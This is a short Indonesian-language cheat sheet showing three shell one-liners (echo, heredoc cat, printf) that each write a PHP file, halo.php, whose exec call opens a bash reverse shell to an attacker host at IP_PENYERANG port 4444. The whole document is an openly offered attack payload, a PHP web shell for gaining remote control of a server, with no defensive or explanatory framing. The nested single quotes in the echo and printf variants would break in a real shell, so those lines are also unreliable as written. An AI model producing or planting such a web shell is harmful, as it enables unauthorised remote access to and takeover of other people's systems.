
## Membuat file php one-liner

### Menggunakan echo (Paling Umum):

```bash
echo '<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_PENYERANG/4444 0>&1'"); ?>' > halo.php
```

### Menggunakan cat (HereDoc):

```bash
cat << 'EOF' > halo.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_PENYERANG/4444 0>&1'"); ?>
EOF
```

### Menggunakan printf:

```bash
printf '<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP_PENYERANG/4444 0>&1'"); ?>\n' > halo.php
```
